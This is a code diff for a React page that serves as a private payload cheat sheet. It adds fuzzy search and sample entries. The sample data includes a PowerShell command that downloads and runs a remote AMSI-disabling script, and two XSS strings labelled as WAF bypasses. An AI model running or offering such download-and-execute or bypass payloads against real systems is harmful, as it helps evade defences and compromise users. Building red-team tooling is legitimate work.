@@ -1,45 +1,69 @@
-import React, { useState } from 'react';
-import { Button, Divider, Input, Modal, Table, Tag, Typography, message, Dropdown, Space } from 'antd';
-import { SearchOutlined } from '@ant-design/icons';
-import type { ColumnsType, TableProps } from 'antd/es/table';
-import { ColumnType, FilterConfirmProps, FilterValue, SorterResult } from 'antd/es/table/interface';
+import { Divider, Dropdown, Input, Table, Tag, Typography, message } from 'antd';
+import Fuse from 'fuse.js';
+import { useState } from 'react';
 
 const index = () => {
 
   const [messageApi, contextHolder] = message.useMessage();
   const [data, setData] = useState([]);
-  const [searchText, setSearchText] = React.useState<string>('');
-  const [searchedColumn, setSearchedColumn] = React.useState<string>('');
 
-  const handleReset = (clearFilters: () => void) => {
-    clearFilters();
-    setSearchText('');
-  };
+  const fuseOptions = {
+    keys:
+      [
+        'name',
+        'description',
+        'tags',
+        'substeps.description',
+        'substeps.payload',
+        
+      ]
+  }
 
   interface DataType {
     id: string;
     name: string;
-    payload: string;
-    description: string;
     tags: string[];
+    description: string;
+    substeps: Substep[];
+  }
+
+  interface Substep {
+    description: string;
+    payload: string | null;
   }
 
   const exampleData: DataType[] = [
     {
       id: '1',
       name: 'AMSI / ETW Bypass',
-      payload: 'test1',
       description: 'Bypass AMSI and ETW powershell payload',
+      substeps: [
+        {
+          description: 'Bypass AMSI/ETW',
+          payload: 'powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString(\'https://raw.githubusercontent.com/3gstudent/Disable_AMSI/master/Disable_AMSI.ps1\');Disable-AMSI"',
+        },
+      ],
       tags: ['Windows', 'Bypass', 'PowerShell'],
     },
     {
       id: '2',
-      name: 'Amazing custom Payload',
-      payload: 'xss',
-      description: 'WAF bypass XSS payload',
-      tags: ['Web', 'XSS', 'WAF'],
+      name: 'XSS',
+      description: 'XSS WAF bypassing payloads',
+      substeps: [
+        {
+          description: 'WAF bypass',
+          payload: '<script>alert(1)</script>',
+        },
+        {
+          description: 'WAF bypass',
+          payload: '<svg/onload=alert(1)',
+        },
+      ],
+      tags: ['XSS', 'WAF'],
     },
   ];
+  const fuse = new Fuse(exampleData, fuseOptions);
+  const [searchResults, setSearchResults] = useState<DataType[]>(exampleData);
 
   const items = [
     {
@@ -61,58 +85,16 @@ const index = () => {
     messageApi.success('Your payload has been copied to the clipboard!');
   };
 
-
-  const searchInput = React.useRef<any>(null);
-  type DataIndex = string | string[];
-
-  const handleSearch = (selectedKeys: any, confirm: () => void, dataIndex: string) => {
-    confirm();
-    setSearchText(selectedKeys[0]);
-    setSearchedColumn(dataIndex);
+  const handleSearch = (value: string) => {
+    console.log(value);
+    if (value) {
+      const results = fuse.search(value);
+      console.log({results})
+      setSearchResults(results.map(result => result.item));
+    } else {
+      setSearchResults(exampleData);
+    }
   };
-
-
-
-  const getColumnSearchProps = (dataIndex: DataIndex): ColumnType<DataType> => ({
-    filterDropdown: ({ setSelectedKeys, selectedKeys, confirm, clearFilters }) => (
-      <div style={{ padding: 8 }}>
-        <Input
-          ref={searchInput}
-          placeholder={`Search Tag / Description / Payload / Name`}
-          value={selectedKeys[0]}
-          onChange={e => setSelectedKeys(e.target.value ? [e.target.value] : [])}
-          onPressEnter={() => handleSearch(selectedKeys, confirm, Array.isArray(dataIndex) ? dataIndex.join(',') : dataIndex)}
-          style={{ marginBottom: 8, display: 'block' }}
-        />
-        <Space>
-          <Button
-            type="primary"
-            onClick={() => handleSearch(selectedKeys, confirm, Array.isArray(dataIndex) ? dataIndex.join(',') : dataIndex)}
-            icon={<SearchOutlined />}
-            size="small"
-            style={{ width: 90 }}
-          >
-            Search
-          </Button>
-          <Button onClick={() => handleReset(clearFilters)} size="small" style={{ width: 90 }}>
-            Reset
-          </Button>
-        </Space>
-      </div>
-    ),
-    filterIcon: filtered => <SearchOutlined style={{ color: filtered ? '#1890ff' : undefined }} />,
-    onFilter: (value, record) => record[dataIndex as keyof DataType].toString().toLowerCase().includes(value.toString().toLowerCase())
-      || record.tags.toString().toLowerCase().includes(value.toString().toLowerCase()) || record.description.toString().toLowerCase().includes(value.toString().toLowerCase()) || record.payload.toString().toLowerCase().includes(value.toString().toLowerCase())
-    ,
-    onFilterDropdownVisibleChange: visible => {
-      if (visible) {
-        setTimeout(() => searchInput.current?.select(), 100);
-      }
-    },
-  });
-
-
-
 
   const columns = [
     {
@@ -129,14 +111,13 @@ const index = () => {
       title: 'Description',
       dataIndex: 'description',
       key: 'description',
-      ...getColumnSearchProps('description'),
     },
     {
       title: 'Tags',
       dataIndex: 'tags',
-      key: 'tags', 
+      key: 'tags',
       filters: Array.from(new Set(exampleData.flatMap(item => item.tags))).map(tag => ({ text: tag, value: tag })),
-      onFilter: (value, record) => 
+      onFilter: (value, record) =>
         record.tags.toString().toLowerCase().includes(value.toString().toLowerCase()),
       render: (tags: string[]) => (
         <>
@@ -196,14 +177,32 @@ const index = () => {
       <Paragraph>
         Your Private Cheat Sheet with all the payloads you have saved.
       </Paragraph>
+
+      <Input.Search
+        placeholder="Search"
+        onChange={e => handleSearch(e.target.value)}
+      />
       <Divider />
 
-      <Table columns={columns} dataSource={exampleData} rowKey="id"
+      <Divider />
+
+      <Table columns={columns} dataSource={searchResults} rowKey="id"
         expandable={{
           expandedRowRender: (record: DataType) =>
             <>
               <Paragraph>{record.description}</Paragraph>
-              <Paragraph code copyable editable>{record.payload}</Paragraph>
+              <>
+                {record.substeps.map((substep, index) => (
+                  <>
+                    <Paragraph>
+                      {substep.description}
+                    </Paragraph>
+                    <Paragraph code copyable editable>
+                      {substep.payload}
+                    </Paragraph>
+                  </>
+                ))}
+              </>
             </>
         }}
       />
